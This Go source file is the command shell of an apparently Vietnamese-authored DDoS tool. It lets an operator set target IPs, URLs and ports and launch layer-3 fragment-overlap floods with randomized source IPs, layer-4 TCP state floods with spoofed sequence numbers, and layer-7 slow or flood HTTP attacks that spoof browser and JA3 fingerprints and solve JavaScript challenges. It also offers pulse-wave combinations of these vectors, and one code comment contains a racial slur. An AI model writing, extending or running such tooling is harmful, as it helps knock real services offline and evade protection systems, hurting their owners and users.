//go:build linux

package cmd

import (
    "bufio"
    "byter/core"
    "fmt"
    "os"
    "strconv"
    "strings"
    "time"
)

func RunShell(st *core.EngineState) {
    sc := bufio.NewScanner(os.Stdin)
    for {
        fmt.Print("shell > ")
        if !sc.Scan() {
            fmt.Println()
            return
        }
        line := strings.TrimSpace(sc.Text())
        if line == "" {
            continue
        }
        args := strings.Fields(line)
        cmd := args[0]

        switch cmd {
        case "exit", "quit", "q":
            st.StopRunning()
            fmt.Println("[*] bye boss.")
            return
        case "help", "-h", "--h":
            printHelp()
        case "banner":
            PrintBanner()
            PrintExamples()
        case "show":
            handleShow(st)
        case "set":
            handleSet(st, args)
        case "status":
            handleStatus(st)
        case "stop":
            if st.IsRunning() {
                st.StopRunning()
                fmt.Println("\n[*] stopped vector:", st.CurrentMode)
            } else {
                fmt.Println("[*] There are no running vectors.")
            }
        case "1", "l3":
            startL3(st)
        case "2", "l4":
            startL4(st)
        case "3", "l7":
            startL7(st)
        case "4", "muwave", "wave":
            startMu(st)
        case "run":
            if len(args) < 2 {
                fmt.Println("usage: run l3|l4|l7|wave")
                continue
            }
            switch args[1] {
            case "l3":
                startL3(st)
            case "l4":
                startL4(st)
            case "l7":
                startL7(st)
            case "wave", "muwave":
                startMu(st)
            default:
                fmt.Println("unknown mode:", args[1])
            }
        default:
            fmt.Println("unknown command:", cmd, "| gõ help")
        }
    }
}

func printHelp() {
	fmt.Println("commands:")
	fmt.Println("  [1] l3        layer3 fragment-overlap (random payload/TTL/srcIP)")
	fmt.Println("  [2] l4        layer4 state-flood (TCP options, seq pattern, flag mix)")
	fmt.Println("  [3] l7        layer7 low-and-slow / flood / hybrid")
	fmt.Println("  [4] wave pulse-wave (multiple vectors, burst x5 rate)")
	fmt.Println("  run <mode>    similar [1..4]")
	fmt.Println()
	fmt.Println("  Global:")
	fmt.Println("    set target <ip> | set port <n> | set rate <n>")
	fmt.Println("    set threads <n> | set flood steady|burst|adaptive")
	fmt.Println()
	fmt.Println("  L3:")
	fmt.Println("    set l3 target <ip> | set l3 rate <n> | set l3 threads <n>")
	fmt.Println("    set l3 flood burst | set l3 overlap true | set l3 fuzz-id true")
	fmt.Println("    (src IP, TTL, payload đã random tự động)")
	fmt.Println()
	fmt.Println("  L4:")
	fmt.Println("    set l4 target <ip> | set l4 port <n> | set l4 window <n>")
	fmt.Println("    set l4 flags ACK,FIN | set l4 spoof-seq true | set l4 threads <n>")
	fmt.Println("    (TCP options MSS/SACK/WScale, seq pattern, src port auto random)")
	fmt.Println()
	fmt.Println("  L7:")
	fmt.Println("    set l7 url <full-url>")
	fmt.Println("    set l7 mode slow|flood|hybrid")
	fmt.Println("    set l7 threads <n> | set l7 conns <n>")
	fmt.Println("    set l7 win-shrink <n> | set l7 interval <n>")
	fmt.Println("    set l7 browser chrome|firefox|safari")
	fmt.Println("    set l7 js-solver none|goja|chromedp")
	fmt.Println("    set l7 ja3 true|false | set l7 http2 true|false")
	fmt.Println("    set l7 referer-chain true|false")
	fmt.Println()
	fmt.Println("  Wave:")
	fmt.Println("    set wave on 60s | set wave off 5s | set wave jitter 3s")
	fmt.Println("    set wave vectors l3,l4,l7")
	fmt.Println("    (automatically triggers burst + 5x rate boost during pulse)")
	fmt.Println()
	fmt.Println("  show | status | stop | banner | help | exit")
}

func handleShow(st *core.EngineState) {
    fmt.Println("=== Global ===")
    fmt.Printf("target=%s port=%d rate=%d threads=%d flood=%s\n",
        st.Global.Target, st.Global.Port, st.Global.Rate, st.Global.Threads, st.Global.Flood)

    fmt.Println("=== L3 ===")
    fmt.Printf("target=%s rate=%d threads=%d flood=%s overlap=%v fuzz-id=%v\n",
        st.L3.Target, st.L3.Rate, st.L3.Threads, st.L3.Flood,
        st.L3.OffsetOverlap, st.L3.FuzzID)

        //fix here nigga
    fmt.Println("=== L4 ===")
    fmt.Printf("target=%s port=%d window=%d flags=%v spoof-seq=%v threads=%d flood=%s\n", 
        st.L4.Target, st.L4.Port, st.L4.Window, st.L4.Flags,
        st.L4.SpoofSeq, st.L4.Threads, st.L4.Flood)

    fmt.Println("=== L7 ===")
    fmt.Printf("mode=%s url=%q threads=%d conns=%d win-shrink=%d interval=%d\n",
        st.L7.Mode, st.L7.URL, st.L7.Threads, st.L7.ConnPerThread,
        st.L7.WinShrink, st.L7.Interval)
    fmt.Printf("browser=%s js=%s ja3=%v http2=%v referer=%v\n",
        st.L7.Browser, st.L7.JSSolver, st.L7.JA3Spoof,
        st.L7.HTTP2, st.L7.RefererChain)

    fmt.Println("=== Wave ===")
    fmt.Printf("on=%s off=%s jitter=%s vectors=%v\n",
        st.Wave.PulseOn, st.Wave.PulseOff, st.Wave.Jitter, st.Wave.Vectors)
}

func handleSet(st *core.EngineState, args []string) {
    if len(args) < 3 {
        fmt.Println("usage: set <key> <value>  hoặc  set <l3|l4|l7|wave> <key> <value>")
        return
    }

    switch args[1] {
    case "l3":
        handleSetL3(st, args[2:])
        return
    case "l4":
        handleSetL4(st, args[2:])
        return
    case "l7":
        handleSetL7(st, args[2:])
        return
    case "wave":
        handleSetWave(st, args[2:])
        return
    }

    key, val := args[1], args[2]
    switch key {
    case "target":
        st.Global.Target = val
        if st.L3.Target == "" {
            st.L3.Target = val
        }
        if st.L4.Target == "" {
            st.L4.Target = val
        }
        fmt.Println("[*] global target =", val)
    case "port":
        n, err := strconv.Atoi(val)
        if err != nil {
            fmt.Println("[!] Invalid port")
            return
        }
        st.Global.Port = n
        if st.L4.Port == 0 {
            st.L4.Port = n
        }
        fmt.Println("[*] global port =", n)
    case "rate":
        n, err := strconv.Atoi(val)
        if err != nil {
            fmt.Println("[!] Invalid rate")
            return
        }
        st.Global.Rate = n
        if st.L3.Rate == 0 {
            st.L3.Rate = n
        }
        fmt.Println("[*] global rate =", n)
    case "threads":
        n, err := strconv.Atoi(val)
        if err != nil || n < 1 {
            fmt.Println("[!] threads >= 1")
            return
        }
        st.Global.Threads = n
        fmt.Println("[*] global threads =", n)
    case "flood":
        m, ok := parseFlood(val)
        if !ok {
            fmt.Println("[!] chỉ steady|burst|adaptive")
            return
        }
        st.Global.Flood = m
        fmt.Println("[*] global flood =", val)
    default:
        fmt.Println("unknown global key:", key)
    }
}

func handleSetL3(st *core.EngineState, args []string) {
    if len(args) < 2 {
        fmt.Println("usage: set l3 <key> <value>")
        return
    }
    key, val := args[0], args[1]
    switch key {
    case "target":
        st.L3.Target = val
        fmt.Println("[*] l3 target =", val)
    case "rate":
        n, _ := strconv.Atoi(val)
        st.L3.Rate = n
        fmt.Println("[*] l3 rate =", n)
    case "threads":
        n, _ := strconv.Atoi(val)
        if n < 1 {
            n = 1
        }
        st.L3.Threads = n
        fmt.Println("[*] l3 threads =", n)
    case "flood":
        m, ok := parseFlood(val)
        if !ok {
            fmt.Println("[!] steady|burst|adaptive")
            return
        }
        st.L3.Flood = m
        fmt.Println("[*] l3 flood =", val)
    case "overlap":
        st.L3.OffsetOverlap = val == "true" || val == "1"
        fmt.Println("[*] l3 overlap =", st.L3.OffsetOverlap)
    case "fuzz-id":
        st.L3.FuzzID = val == "true" || val == "1"
        fmt.Println("[*] l3 fuzz-id =", st.L3.FuzzID)
    default:
        fmt.Println("unknown l3 key:", key)
    }
}

func handleSetL4(st *core.EngineState, args []string) {
    if len(args) < 2 {
        fmt.Println("usage: set l4 <key> <value>")
        return
    }
    key, val := args[0], args[1]
    switch key {
    case "target":
        st.L4.Target = val
        fmt.Println("[*] l4 target =", val)
    case "port":
        n, _ := strconv.Atoi(val)
        st.L4.Port = n
        fmt.Println("[*] l4 port =", n)
    case "window":
        n, _ := strconv.Atoi(val)
        st.L4.Window = n
        fmt.Println("[*] l4 window =", n)
    case "flags":
        parts := strings.Split(strings.ToUpper(val), ",")
        st.L4.Flags = parts
        fmt.Println("[*] l4 flags =", parts)
    case "spoof-seq":
        st.L4.SpoofSeq = val == "true" || val == "1"
        fmt.Println("[*] l4 spoof-seq =", st.L4.SpoofSeq)
    case "threads":
        n, _ := strconv.Atoi(val)
        if n < 1 {
            n = 1
        }
        st.L4.Threads = n
        fmt.Println("[*] l4 threads =", n)
    case "flood":
        m, ok := parseFlood(val)
        if !ok {
            fmt.Println("[!] steady|burst|adaptive")
            return
        }
        st.L4.Flood = m
        fmt.Println("[*] l4 flood =", val)
    default:
        fmt.Println("unknown l4 key:", key)
    }
}

func handleSetL7(st *core.EngineState, args []string) {
    if len(args) < 2 {
        fmt.Println("usage: set l7 <key> <value>")
        return
    }
    key, val := args[0], args[1]
    switch key {
    case "url":
        st.L7.URL = val
        fmt.Println("[*] l7 url =", val)
    case "mode":
        switch val {
        case "slow", "flood", "hybrid":
            st.L7.Mode = val
            fmt.Println("[*] l7 mode =", val)
        default:
            fmt.Println("[!] slow|flood|hybrid")
        }
    case "threads":
        n, _ := strconv.Atoi(val)
        if n < 1 {
            n = 1
        }
        st.L7.Threads = n
        fmt.Println("[*] l7 threads =", n)
    case "conns":
        n, _ := strconv.Atoi(val)
        if n < 1 {
            n = 1
        }
        st.L7.ConnPerThread = n
        fmt.Println("[*] l7 conns/thread =", n)
    case "win-shrink":
        n, _ := strconv.Atoi(val)
        if n < 1 {
            n = 1
        }
        st.L7.WinShrink = n
        fmt.Println("[*] l7 win-shrink =", n)
    case "interval":
        n, _ := strconv.Atoi(val)
        if n < 1 {
            n = 1
        }
        st.L7.Interval = n
        fmt.Println("[*] l7 interval =", n)
    case "browser":
        switch val {
        case "chrome", "firefox", "safari":
            st.L7.Browser = val
            fmt.Println("[*] l7 browser =", val)
        default:
            fmt.Println("[!] chrome|firefox|safari")
        }
    case "js-solver":
        switch val {
        case "none", "goja", "chromedp":
            st.L7.JSSolver = val
            fmt.Println("[*] l7 js-solver =", val)
        default:
            fmt.Println("[!] none|goja|chromedp")
        }
    case "ja3":
        st.L7.JA3Spoof = val == "true" || val == "1"
        fmt.Println("[*] l7 ja3 =", st.L7.JA3Spoof)
    case "http2":
        st.L7.HTTP2 = val == "true" || val == "1"
        fmt.Println("[*] l7 http2 =", st.L7.HTTP2)
    case "referer-chain":
        st.L7.RefererChain = val == "true" || val == "1"
        fmt.Println("[*] l7 referer-chain =", st.L7.RefererChain)
    default:
        fmt.Println("unknown l7 key:", key)
    }
}

func handleSetWave(st *core.EngineState, args []string) {
    if len(args) < 2 {
        fmt.Println("usage: set wave <key> <value>")
        return
    }
    key, val := args[0], args[1]
    switch key {
    case "on":
        d, err := time.ParseDuration(val)
        if err != nil {
            fmt.Println("[!] format: 60s, 1m")
            return
        }
        st.Wave.PulseOn = d
        fmt.Println("[*] wave on =", d)
    case "off":
        d, err := time.ParseDuration(val)
        if err != nil {
            fmt.Println("[!] format: 5s, 30s")
            return
        }
        st.Wave.PulseOff = d
        fmt.Println("[*] wave off =", d)
    case "jitter":
        d, err := time.ParseDuration(val)
        if err != nil {
            fmt.Println("[!] format: 3s")
            return
        }
        st.Wave.Jitter = d
        fmt.Println("[*] wave jitter =", d)
    case "vectors":
        parts := strings.Split(val, ",")
        st.Wave.Vectors = parts
        fmt.Println("[*] wave vectors =", parts)
    default:
        fmt.Println("unknown wave key:", key)
    }
}

func parseFlood(s string) (core.FloodMode, bool) {
    switch s {
    case "steady":
        return core.FloodSteady, true
    case "burst":
        return core.FloodBurst, true
    case "adaptive":
        return core.FloodAdaptive, true
    }
    return core.FloodSteady, false
}

func handleStatus(st *core.EngineState) {
    succ, fail, bytes, c, upt := st.Counters.Snapshot()
    running := "idle"
    if st.IsRunning() {
        running = st.CurrentMode
    }
    fmt.Printf("[*] mode=%s uptime=%s\n", running, upt.Truncate(time.Second))
    fmt.Printf("[*] succ=%d fail=%d bytes=%d active_conns=%d\n", succ, fail, bytes, c)
}

func startL3(st *core.EngineState) {
    if st.IsRunning() {
        fmt.Println("[!] Another vector is running; type 'stop' first.")
        return
    }
    stop := make(chan struct{})
    st.StopCurrent = stop
    st.CurrentMode = "l3-fragment"
    go core.LiveCounter(st, stop)
    go func() {
        if err := core.L3Fragment(st, stop); err != nil {
            fmt.Println("\n[L3] error:", err)
        }
    }()
    fmt.Println("[*] L3 started")
}

func startL4(st *core.EngineState) {
    if st.IsRunning() {
        fmt.Println("[!] Another vector is running; type 'stop' first.")
        return
    }
    stop := make(chan struct{})
    st.StopCurrent = stop
    st.CurrentMode = "l4-state"
    go core.LiveCounter(st, stop)
    go func() {
        if err := core.L4State(st, stop); err != nil {
            fmt.Println("\n[L4] error:", err)
        }
    }()
    fmt.Println("[*] L4 started")
}

func startL7(st *core.EngineState) {
    if st.IsRunning() {
        fmt.Println("[!] Another vector is running; type 'stop' first.")
        return
    }
    if st.L7.URL == "" {
        fmt.Println("[!] URL not set; use: set l7 url https://...")
        return
    }
    stop := make(chan struct{})
    st.StopCurrent = stop
    st.CurrentMode = "l7-asymmetric"
    go core.LiveCounter(st, stop)
    go func() {
        if err := core.L7Asymmetric(st, stop); err != nil {
            fmt.Println("\n[L7] error:", err)
        }
    }()
    fmt.Println("[*] L7 started ->", st.L7.URL)
}

func startMu(st *core.EngineState) {
    if st.IsRunning() {
        fmt.Println("[!] Another vector is running; type 'stop' first.")
        return
    }
    stop := make(chan struct{})
    st.StopCurrent = stop
    st.CurrentMode = "pulse-wave"
    go core.LiveCounter(st, stop)
    go func() {
        if err := core.PulseWave(st, stop); err != nil {
            fmt.Println("\n[WAVE] error:", err)
        }
    }()
    fmt.Println("[*] WAVE started")
}